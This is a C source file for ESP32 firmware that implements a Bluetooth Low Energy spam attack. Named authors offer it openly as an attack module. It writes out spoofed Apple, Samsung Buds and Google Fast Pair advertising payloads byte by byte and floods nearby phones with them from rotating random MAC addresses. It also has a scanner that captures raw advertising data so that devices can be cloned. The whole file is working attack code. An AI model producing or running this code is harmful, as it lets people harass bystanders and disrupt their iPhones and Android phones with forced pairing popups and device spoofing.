/**
 * @file attack_bt_spam.c
 * @author Raghu Saxena (poiasdpoiasd@live.com) and Willy-JL, ECTO-1A, Spooks4576
 * @brief BLE Spam Attack — Enhanced with mutex, timeout, status reporting
 *
 * Floods nearby BLE scanners with fake advertising packets using rotating
 * random MAC addresses.  Four device-profile families are supported:
 *
 *   Apple Audio  (1-8)   — AirPods / AirTag popups on iOS
 *   Apple Setup  (9-13)  — "New device" pairing screens on iOS
 *   Samsung Buds (14-19) — Galaxy Buds Fast Pair popups on Android
 *   Google FP    (20-24) — Generic Fast Pair notifications on Android
 *   Random Mix   (25)    — Cycles through all four families
 *
 * Concurrency:
 *   NimBLE controller supports only ONE GAP procedure at a time.  The
 *   task yields when scan / connect is active elsewhere, preventing
 *   BLE_GAP_ERR_*_COMMAND_DISALLOWED errors.
 *
 * Thread safety:
 *   Mutex protects config and stats.  `running` is volatile for safe
 *   cross-task reads.  An optional esp_timer auto-stops after N seconds.
 */

#include "attack_bt_spam.h"
#include <string.h>
#include <stdlib.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

/* NimBLE headers */
#include "host/ble_gap.h"
#include "host/ble_hs.h"
#include "host/ble_store.h"
#include "nimble/ble.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "services/gap/ble_svc_gap.h"
#include "esp_nimble_hci.h"

#include "ble_common.h"
#include "cJSON.h"
#include "heap_psram.h"

static const char *TAG = "attack_bt_spam";

/* ================================================================== */
/*  Device model tables                                                */
/* ================================================================== */

static const uint16_t apple_audio_models[] = {
    0x0E20, 0x0A20, 0x0220, 0x0F20, 0x1320, 0x1420,
    0x1020, 0x0620, 0x0320, 0x0B20, 0x0C20, 0x1120,
    0x0520, 0x0920, 0x1720, 0x1220, 0x1620, 0x0055, 0x0030,
};
#define APPLE_AUDIO_MODEL_COUNT  (sizeof(apple_audio_models) / sizeof(apple_audio_models[0]))

static const uint8_t apple_setup_actions[] = {
    0x13, 0x24, 0x27, 0x20, 0x19, 0x1E,
    0x09, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B,
};
#define APPLE_SETUP_ACTION_COUNT (sizeof(apple_setup_actions) / sizeof(apple_setup_actions[0]))

static const uint32_t samsung_buds_models[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116,
    0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17,
    0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503,
    0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
};
#define SAMSUNG_BUDS_MODEL_COUNT (sizeof(samsung_buds_models) / sizeof(samsung_buds_models[0]))

static const uint32_t fastpair_models[] = {
    0xCD8256, 0x0000F0, 0x821F66, 0xF52494, 0x718FA4,
    0x92BBBD, 0xD446A7, 0x2D7A23, 0x9ADB11, 0x8B66AB, 0xD99CA1,
};
#define FASTPAIR_MODEL_COUNT    (sizeof(fastpair_models) / sizeof(fastpair_models[0]))

/* ================================================================== */
/*  Timing / task constants                                            */
/* ================================================================== */

#define ADV_DURATION_APPLE_MS    200
#define ADV_DURATION_OTHER_MS    100
#define IDLE_AFTER_APPLE_MS       15
#define IDLE_AFTER_OTHER_MS       20
#define DEFAULT_TIMEOUT_SEC      300   /* 5 minutes — matches other modules */
#define TASK_STACK_SIZE          4096
#define TASK_PRIORITY            5
#define STOP_TIMEOUT_MS          3000

/* ================================================================== */
/*  Module state                                                       */
/* ================================================================== */

static volatile bool         initialized     = false;
static volatile bool         running         = false;
static volatile bool         was_timeout     = false;
static TaskHandle_t          task_handle     = NULL;
static SemaphoreHandle_t     mutex           = NULL;
static SemaphoreHandle_t     task_exit_sem   = NULL;
static esp_timer_handle_t    timeout_timer   = NULL;

/* Stats — protected by mutex */
static volatile uint32_t     packet_count    = 0;
static int64_t               start_time_us   = 0;
static int                   timeout_sec     = DEFAULT_TIMEOUT_SEC;
static bt_spam_config_t      active_config   = {0};

/* Scan results — used by init and scan APIs (must be above attack_bt_spam_init) */
typedef struct {
    char   addr[18];
    int8_t rssi;
    char   name[64];
    char   adv_data[63];  /* Hex string of raw advertising data (max 31 bytes = 62 hex chars + NUL) */
} scan_entry_t;

#define MAX_SCAN_RESULTS  50
static scan_entry_t         *scan_results = NULL;
static uint8_t               scan_count   = 0;
static SemaphoreHandle_t     scan_mutex   = NULL;

/* ================================================================== */
/*  Forward declarations                                               */
/* ================================================================== */

static void spam_task(void *arg);
static void set_random_mac(void);
static int  adv_event_cb(struct ble_gap_event *event, void *arg);
static void timeout_timer_cb(void *arg);
static size_t gen_apple_audio(uint8_t *buf);
static size_t gen_apple_setup(uint8_t *buf);
static size_t gen_samsung_buds(uint8_t *buf);
static size_t gen_fastpair(uint8_t *buf);
static bool   is_apple_type(int t);

/* ================================================================== */
/*  Advertising payload generators                                     */
/* ================================================================== */

/**
 * Apple Proximity Pairing — AirPods / AirTag style.
 * Total payload: 31 bytes (fills entire ADV packet).
 * Triggers automatic popup notifications on nearby iPhones.
 */
static size_t gen_apple_audio(uint8_t *buf) {
    uint16_t model  = apple_audio_models[esp_random() % APPLE_AUDIO_MODEL_COUNT];
    uint8_t  prefix = (model == 0x0055 || model == 0x0030)
                      ? 0x05
                      : ((esp_random() % 2) ? 0x07 : 0x01);
    uint8_t  color  = esp_random() % 16;

    uint8_t i = 0;
    buf[i++] = 0x1E;       /* AD length = 30 */
    buf[i++] = 0xFF;       /* Manufacturer Specific */
    buf[i++] = 0x4C;       /* Apple Inc. company ID (LE) */
    buf[i++] = 0x00;
    buf[i++] = 0x07;       /* ContinuityTypeProximityPair */
    buf[i++] = 0x19;       /* data length = 25 */
    buf[i++] = prefix;
    buf[i++] = (model >> 8) & 0xFF;
    buf[i++] = (model >> 0) & 0xFF;
    buf[i++] = 0x55;       /* status */
    buf[i++] = ((esp_random() % 10) << 4) | (esp_random() % 10);  /* buds battery */
    buf[i++] = ((esp_random() % 8)  << 4) | (esp_random() % 10);  /* case + charge */
    buf[i++] = esp_random() & 0xFF;  /* lid open counter */
    buf[i++] = color;
    buf[i++] = 0x00;
    esp_fill_random(&buf[i], 16);
    i += 16;
    return i;  /* 31 */
}

/**
 * Apple Nearby Action — "New device setup" style.
 * Total payload: 11 bytes.
 * Triggers pairing / setup screens on nearby iOS devices.
 */
static size_t gen_apple_setup(uint8_t *buf) {
    uint8_t action = apple_setup_actions[esp_random() % APPLE_SETUP_ACTION_COUNT];
    uint8_t flags  = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;

    uint8_t i = 0;
    buf[i++] = 0x0A;       /* AD length = 10 */
    buf[i++] = 0xFF;       /* Manufacturer Specific */
    buf[i++] = 0x4C;       /* Apple Inc. */
    buf[i++] = 0x00;
    buf[i++] = 0x0F;       /* ContinuityTypeNearbyAction */
    buf[i++] = 0x05;       /* data length = 5 */
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);  /* fake auth tag */
    i += 3;
    return i;  /* 11 */
}

/**
 * Samsung Galaxy Buds advertisement.
 * Total payload: 31 bytes (fills entire ADV packet).
 * Triggers Android Fast Pair popup for Galaxy Buds.
 *
 * Note: the second AD structure header at byte 28 (length=0x10) is
 * intentionally truncated — Android pads the rest or ignores it.
 * This matches real Samsung buds behaviour.
 */
static size_t gen_samsung_buds(uint8_t *buf) {
    uint32_t model = samsung_buds_models[esp_random() % SAMSUNG_BUDS_MODEL_COUNT];

    uint8_t i = 0;
    buf[i++] = 27;         /* AD length */
    buf[i++] = 0xFF;       /* Manufacturer Specific */
    buf[i++] = 0x75;       /* Samsung Electronics Co. Ltd. */
    buf[i++] = 0x00;
    buf[i++] = 0x42;
    buf[i++] = 0x09;
    buf[i++] = 0x81;
    buf[i++] = 0x02;
    buf[i++] = 0x14;
    buf[i++] = 0x15;
    buf[i++] = 0x03;
    buf[i++] = 0x21;
    buf[i++] = 0x01;
    buf[i++] = 0x09;
    buf[i++] = (model >> 16) & 0xFF;
    buf[i++] = (model >>  8) & 0xFF;
    buf[i++] = 0x01;       /* always static */
    buf[i++] = (model >>  0) & 0xFF;
    buf[i++] = 0x06;
    buf[i++] = 0x3C;
    buf[i++] = 0x94;
    buf[i++] = 0x8E;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0xC7;
    buf[i++] = 0x00;
    /* Second AD structure header (truncated — Android ignores) */
    buf[i++] = 0x10;       /* AD length = 16 */
    buf[i++] = 0xFF;       /* Manufacturer Specific */
    buf[i++] = 0x75;       /* Samsung */
    return i;  /* 31 */
}

/**
 * Google Fast Pair advertisement.
 * Total payload: 14 bytes.
 * Triggers Fast Pair notification on nearby Android devices.
 */
static size_t gen_fastpair(uint8_t *buf) {
    uint32_t model = fastpair_models[esp_random() % FASTPAIR_MODEL_COUNT];

    uint8_t i = 0;
    /* Complete List of 16-bit Service UUIDs (0xFE2C = Fast Pair) */
    buf[i++] = 3;
    buf[i++] = 0x03;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    /* Service Data — Fast Pair model ID */
    buf[i++] = 6;
    buf[i++] = 0x16;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    buf[i++] = (model >> 16) & 0xFF;
    buf[i++] = (model >>  8) & 0xFF;
    buf[i++] = (model >>  0) & 0xFF;
    /* TX Power Level */
    buf[i++] = 2;
    buf[i++] = 0x0A;
    buf[i++] = (uint8_t)((esp_random() % 120) - 100);  /* -100 to +19 dBm */
    return i;  /* 14 */
}

/* ================================================================== */
/*  Helpers                                                            */
/* ================================================================== */

static void set_random_mac(void) {
    uint8_t mac[6];
    esp_fill_random(mac, 6);
    mac[5] |= 0xC0;  /* Random static address (BT 4.2 Vol 6 Part B 1.3.2.1) */
    int rc = ble_hs_id_set_rnd(mac);
    if (rc != 0) {
        ESP_LOGW(TAG, "set_random_mac failed: %d", rc);
    }
}

static bool is_apple_type(int t) {
    return (t >= 1 && t <= 13);
}

/* ================================================================== */
/*  Advertising event callback                                         */
/* ================================================================== */

static int adv_event_cb(struct ble_gap_event *event, void *arg) {
    (void)arg;
    switch (event->type) {
        case BLE_GAP_EVENT_ADV_COMPLETE:
            ESP_LOGD(TAG, "Advertising duration completed");
            break;
        case BLE_GAP_EVENT_CONNECT:
            ESP_LOGD(TAG, "Connection received during advertising");
            break;
        default:
            break;
    }
    return 0;
}

/* ================================================================== */
/*  Timeout timer callback                                             */
/* ================================================================== */

static void timeout_timer_cb(void *arg) {
    (void)arg;
    ESP_LOGW(TAG, "BLE spam auto-stop timeout reached (%ds)", timeout_sec);
    was_timeout = true;
    running = false;
}

/* ================================================================== */
/*  Main spam task                                                     */
/* ================================================================== */

static void spam_task(void *arg) {
    bt_spam_config_t *c = (bt_spam_config_t *)arg;
    uint32_t count    = 0;
    uint8_t  adv_raw[31];
    size_t   adv_raw_len;

    /* Copy config and initialise stats under mutex */
    xSemaphoreTake(mutex, portMAX_DELAY);
    memcpy(&active_config, c, sizeof(active_config));
    timeout_sec   = c->timeout_sec > 0 ? c->timeout_sec : DEFAULT_TIMEOUT_SEC;
    start_time_us = esp_timer_get_time();
    packet_count  = 0;
    was_timeout   = false;
    xSemaphoreGive(mutex);

    /* Start optional timeout timer */
    if (timeout_sec > 0 && timeout_timer != NULL) {
        esp_timer_start_once(timeout_timer, (uint64_t)timeout_sec * 1000000);
    }

    ESP_LOGI(TAG, "BLE SPAM STARTED — Device type: %d, Timeout: %ds",
             c->device_type, timeout_sec);

    while (running) {
        /* Yield to other BLE operations — NimBLE controller only supports
         * ONE GAP procedure at a time.  If scanning / connecting is active
         * in another component, skip this cycle. */
        if (ble_gap_conn_active() || ble_gap_disc_active()) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
            vTaskDelay(pdMS_TO_TICKS(20));
        }

        bool apple = is_apple_type(c->device_type);

        /* Random MAC for non-Apple types (Apple uses public addr) */
        if (!apple) {
            set_random_mac();
            vTaskDelay(pdMS_TO_TICKS(10));
        }

        /* ---- Generate advertising payload ---- */
        int t = c->device_type;
        if (t >= 1 && t <= 8) {
            adv_raw_len = gen_apple_audio(adv_raw);
        } else if (t >= 9 && t <= 13) {
            adv_raw_len = gen_apple_setup(adv_raw);
        } else if (t >= 14 && t <= 19) {
            adv_raw_len = gen_samsung_buds(adv_raw);
        } else if (t >= 20 && t <= 24) {
            adv_raw_len = gen_fastpair(adv_raw);
        } else {
            /* Random Mix — cycle through all families */
            int r = esp_random() % 4;
            if      (r == 0) { apple = true;  adv_raw_len = gen_apple_audio(adv_raw);  }
            else if (r == 1) { apple = true;  adv_raw_len = gen_apple_setup(adv_raw);  }
            else if (r == 2) { apple = false; adv_raw_len = gen_samsung_buds(adv_raw); }
            else             { apple = false; adv_raw_len = gen_fastpair(adv_raw);      }
        }

        /* ---- Set advertising data ---- */
        int rc = ble_gap_adv_set_data(adv_raw, adv_raw_len);
        if (rc != 0) {
            ESP_LOGE(TAG, "ble_gap_adv_set_data failed: %d", rc);
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        /* ---- Configure advertising parameters ---- */
        struct ble_gap_adv_params adv_params;
        memset(&adv_params, 0, sizeof(adv_params));
        adv_params.conn_mode   = BLE_GAP_CONN_MODE_NON;
        adv_params.channel_map = 0x07;   /* All 3 adv channels */
        adv_params.disc_mode   = apple ? BLE_GAP_DISC_MODE_GEN
                                       : BLE_GAP_DISC_MODE_NON;

        if (apple) {
            adv_params.itvl_min = 0x30;  /* ~30 ms */
            adv_params.itvl_max = 0x40;
        } else {
            adv_params.itvl_min = 0x20;  /* ~20 ms */
            adv_params.itvl_max = 0x28;
        }

        uint32_t adv_ms = apple ? ADV_DURATION_APPLE_MS
                                : (50 + (esp_random() % 50));

        uint8_t own_addr_type = apple ? BLE_OWN_ADDR_PUBLIC
                                      : BLE_OWN_ADDR_RANDOM;

        rc = ble_gap_adv_start(own_addr_type, NULL, adv_ms,
                               &adv_params, adv_event_cb, NULL);
        if (rc != 0) {
            ESP_LOGE(TAG, "ble_gap_adv_start failed: %d", rc);
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        count++;
        packet_count = count;

        /* Wait for advertising window to finish */
        vTaskDelay(pdMS_TO_TICKS(adv_ms + 20));

        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
        }

        /* Idle between bursts + optional extra delay */
        uint32_t idle_ms = apple ? IDLE_AFTER_APPLE_MS : IDLE_AFTER_OTHER_MS;
        idle_ms += (uint32_t)c->delay_ms;
        vTaskDelay(pdMS_TO_TICKS(idle_ms));

        /* Periodic log */
        if (count % 25 == 0) {
            ESP_LOGI(TAG, "Packets sent: %u", (unsigned)count);
        }
    }

    /* ---- Cleanup ---- */
    if (timeout_timer) {
        esp_timer_stop(timeout_timer);
    }
    if (ble_gap_adv_active()) {
        ble_gap_adv_stop();
    }

    ESP_LOGI(TAG, "BLE SPAM STOPPED | Total: %u packets%s",
             (unsigned)count, was_timeout ? " (timeout)" : "");

    running      = false;
    packet_count = count;
    free(c);
    task_handle  = NULL;
    if (task_exit_sem) xSemaphoreGive(task_exit_sem);
    vTaskDelete(NULL);
}

/* ================================================================== */
/*  Public API — init                                                  */
/* ================================================================== */

void attack_bt_spam_init(void) {
    if (initialized) {
        ESP_LOGW(TAG, "Already initialized");
        return;
    }

    /* Lazy-init mutexes */
    if (mutex == NULL) {
        mutex = xSemaphoreCreateMutex();
    }
    if (task_exit_sem == NULL) {
        task_exit_sem = xSemaphoreCreateBinary();
    }
    if (scan_mutex == NULL) {
        scan_mutex = xSemaphoreCreateMutex();
    }
    if (!scan_results) {
        scan_results = heap_psram_calloc(MAX_SCAN_RESULTS, sizeof(scan_entry_t));
        if (!scan_results) {
            ESP_LOGW(TAG, "PSRAM scan_results alloc failed");
        }
    }

    /* Create timeout timer (once) */
    if (timeout_timer == NULL) {
        const esp_timer_create_args_t timer_args = {
            .callback = timeout_timer_cb,
            .name     = "bt_spam_timeout"
        };
        esp_err_t err = esp_timer_create(&timer_args, &timeout_timer);
        if (err != ESP_OK) {
            ESP_LOGE(TAG, "Failed to create timeout timer: %s", esp_err_to_name(err));
            return;
        }
    }

    /* Delegate NimBLE init to ble_common — idempotent, no double-init risk */
    if (!ble_common_init()) {
        ESP_LOGE(TAG, "NimBLE init failed via ble_common");
        return;
    }

    initialized = true;
    ESP_LOGI(TAG, "BLE spam initialized successfully");
}

/* ================================================================== */
/*  Public API — start                                                 */
/* ================================================================== */

void attack_bt_spam_start(bt_spam_config_t *c) {
    if (!initialized) {
        ESP_LOGE(TAG, "Not initialized! Call attack_bt_spam_init() first");
        return;
    }
    if (running) {
        ESP_LOGW(TAG, "Already running!");
        return;
    }
    if (!c) {
        ESP_LOGE(TAG, "Null config!");
        return;
    }

    if (task_exit_sem != NULL) {
        xSemaphoreTake(task_exit_sem, 0);  /* clear previous signal */
    }

    /* Heap-allocate a copy — the task frees it when done */
    bt_spam_config_t *cfg = malloc(sizeof(bt_spam_config_t));
    if (!cfg) {
        ESP_LOGE(TAG, "Failed to allocate config");
        return;
    }
    memcpy(cfg, c, sizeof(bt_spam_config_t));

    running = true;

    BaseType_t ret = xTaskCreate(spam_task, "bt_spam", TASK_STACK_SIZE,
                                  cfg, TASK_PRIORITY, &task_handle);
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create spam task");
        free(cfg);
        running = false;
        return;
    }
}

/* ================================================================== */
/*  Public API — stop                                                  */
/* ================================================================== */

void attack_bt_spam_stop(void) {
    if (!running && task_handle == NULL) return;

    running = false;

    if (timeout_timer) {
        esp_timer_stop(timeout_timer);
    }

    if (task_exit_sem != NULL) {
        if (xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(STOP_TIMEOUT_MS)) != pdTRUE) {
            ESP_LOGW(TAG, "Task exit timeout, forcing delete");
            if (task_handle != NULL) {
                vTaskDelete(task_handle);
                task_handle = NULL;
            }
        }
    } else {
        vTaskDelay(pdMS_TO_TICKS(500));
        if (task_handle != NULL) {
            vTaskDelete(task_handle);
            task_handle = NULL;
        }
    }

    ESP_LOGI(TAG, "BLE spam stopped");
}

/* ================================================================== */
/*  Public API — status                                                */
/* ================================================================== */

bool attack_bt_spam_is_running(void) {
    return running;
}

uint32_t attack_bt_spam_get_packet_count(void) {
    return packet_count;
}

int attack_bt_spam_get_elapsed_sec(void) {
    if (!running) return 0;
    int64_t elapsed_us = esp_timer_get_time() - start_time_us;
    return (int)(elapsed_us / 1000000);
}

int attack_bt_spam_get_remaining_sec(void) {
    if (!running || timeout_sec <= 0) return 0;
    int elapsed = attack_bt_spam_get_elapsed_sec();
    int remaining = timeout_sec - elapsed;
    return remaining > 0 ? remaining : 0;
}

bool attack_bt_spam_was_timeout(void) {
    return was_timeout;
}

const char *attack_bt_spam_get_device_type_name(void) {
    int t = active_config.device_type;
    if (t >= 1  && t <= 8)  return "Apple Audio";
    if (t >= 9  && t <= 13) return "Apple Setup";
    if (t >= 14 && t <= 19) return "Samsung Buds";
    if (t >= 20 && t <= 24) return "Google Fast Pair";
    return "Random Mix";
}

cJSON *attack_bt_spam_get_status_json(void) {
    xSemaphoreTake(mutex, portMAX_DELAY);
    cJSON *root = cJSON_CreateObject();
    cJSON_AddBoolToObject(root,  "running",          running);
    cJSON_AddNumberToObject(root, "packet_count",     packet_count);
    cJSON_AddNumberToObject(root, "device_type",      active_config.device_type);
    cJSON_AddStringToObject(root, "device_type_name", attack_bt_spam_get_device_type_name());
    cJSON_AddNumberToObject(root, "delay_ms",         active_config.delay_ms);
    cJSON_AddNumberToObject(root, "timeout_sec",      timeout_sec);
    cJSON_AddBoolToObject(root,  "was_timeout",       was_timeout);

    if (running) {
        cJSON_AddNumberToObject(root, "elapsed_sec",  attack_bt_spam_get_elapsed_sec());
        cJSON_AddNumberToObject(root, "remaining_sec", attack_bt_spam_get_remaining_sec());
    }
    xSemaphoreGive(mutex);
    return root;
}

/* ================================================================== */
/*  BLE Scan implementation                                            */
/* ================================================================== */

static int scan_gap_cb(struct ble_gap_event *event, void *arg) {
    switch (event->type) {
        case BLE_GAP_EVENT_DISC: {
            if (!scan_results) return 0;
            if (scan_mutex) xSemaphoreTake(scan_mutex, portMAX_DELAY);
            if (scan_count >= MAX_SCAN_RESULTS) {
                if (scan_mutex) xSemaphoreGive(scan_mutex);
                return 0;
            }

            struct ble_gap_disc_desc *desc = &event->disc;

            /* Format BLE address as string */
            char addr_str[18];
            snprintf(addr_str, sizeof(addr_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                     desc->addr.val[5], desc->addr.val[4], desc->addr.val[3],
                     desc->addr.val[2], desc->addr.val[1], desc->addr.val[0]);

            /* De-duplicate by address — keep strongest RSSI */
            for (uint8_t i = 0; i < scan_count; i++) {
                if (strcmp(scan_results[i].addr, addr_str) == 0) {
                    if (desc->rssi > scan_results[i].rssi) {
                        scan_results[i].rssi = desc->rssi;
                        /* Update name if we now have one */
                        struct ble_hs_adv_fields fields;
                        if (ble_hs_adv_parse_fields(&fields, desc->data,
                                                    desc->length_data) == 0) {
                            if (fields.name_len > 0 && fields.name_len < 64) {
                                memcpy(scan_results[i].name, fields.name,
                                       fields.name_len);
                                scan_results[i].name[fields.name_len] = '\0';
                            }
                        }
                    }
                    if (scan_mutex) xSemaphoreGive(scan_mutex);
                    return 0;
                }
            }

            /* New device — fill entry */
            strncpy(scan_results[scan_count].addr, addr_str, 17);
            scan_results[scan_count].addr[17] = '\0';
            scan_results[scan_count].rssi = desc->rssi;
            scan_results[scan_count].name[0] = '\0';
            scan_results[scan_count].adv_data[0] = '\0';

            /* Parse advertising fields for device name */
            struct ble_hs_adv_fields fields;
            if (ble_hs_adv_parse_fields(&fields, desc->data,
                                        desc->length_data) == 0) {
                if (fields.name_len > 0 && fields.name_len < 64) {
                    memcpy(scan_results[scan_count].name, fields.name,
                           fields.name_len);
                    scan_results[scan_count].name[fields.name_len] = '\0';
                }
            }

            /* Store raw advertising data as hex string for clone feature */
            if (desc->length_data > 0 && desc->length_data <= 31) {
                for (int i = 0; i < desc->length_data; i++) {
                    snprintf(&scan_results[scan_count].adv_data[i * 2], 3,
                             "%02x", desc->data[i]);
                }
            }

            scan_count++;
            ESP_LOGD(TAG, "Found device: %s RSSI=%d name=%s",
                     addr_str, desc->rssi,
                     scan_results[scan_count - 1].name);
            if (scan_mutex) xSemaphoreGive(scan_mutex);
            return 0;
        }
        case BLE_GAP_EVENT_DISC_COMPLETE:
            ESP_LOGI(TAG, "BLE scan completed, found %u devices", scan_count);
            return 0;
        default:
            return 0;
    }
}

cJSON *attack_bt_scan(int timeout_ms) {
    ESP_LOGI(TAG, "BLE scan requested timeout=%dms", timeout_ms);

    if (!initialized) {
        ESP_LOGW(TAG, "BLE module not initialized; initializing for scan");
        attack_bt_spam_init();
        if (!initialized) {
            ESP_LOGE(TAG, "Failed to init BLE for scan");
            return cJSON_CreateArray();
        }
    }

    if (!scan_results) {
        ESP_LOGE(TAG, "Scan buffer not allocated");
        return cJSON_CreateArray();
    }

    if (scan_mutex) xSemaphoreTake(scan_mutex, portMAX_DELAY);
    scan_count = 0;
    memset(scan_results, 0, MAX_SCAN_RESULTS * sizeof(scan_entry_t));
    if (scan_mutex) xSemaphoreGive(scan_mutex);

    /* Stop advertising if currently active */
    if (ble_gap_adv_active()) {
        ble_gap_adv_stop();
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    struct ble_gap_disc_params params;
    memset(&params, 0, sizeof(params));
    params.passive           = 0;       /* Active scan — request scan responses */
    params.itvl              = 0x0010;  /* 10 ms interval */
    params.window            = 0x0010;  /* 10 ms window (100% duty cycle) */
    params.filter_duplicates = 0;

    int rc = ble_gap_disc(ble_common_own_addr_type(), timeout_ms,
                          &params, scan_gap_cb, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "Scan start failed: %d", rc);
        return cJSON_CreateArray();
    }

    /* Block until scan completes */
    vTaskDelay(pdMS_TO_TICKS(timeout_ms + 500));

    /* Build JSON response */
    cJSON *arr = cJSON_CreateArray();
    if (scan_mutex) xSemaphoreTake(scan_mutex, portMAX_DELAY);
    for (uint8_t i = 0; i < scan_count; i++) {
        cJSON *obj = cJSON_CreateObject();
        cJSON_AddStringToObject(obj, "addr",     scan_results[i].addr);
        cJSON_AddNumberToObject(obj, "rssi",     scan_results[i].rssi);
        cJSON_AddStringToObject(obj, "name",     scan_results[i].name);
        if (scan_results[i].adv_data[0] != '\0') {
            cJSON_AddStringToObject(obj, "adv_data", scan_results[i].adv_data);
        }
        cJSON_AddItemToArray(arr, obj);
    }
    if (scan_mutex) xSemaphoreGive(scan_mutex);

    ESP_LOGI(TAG, "BLE scan returning %u devices", scan_count);
    return arr;
}
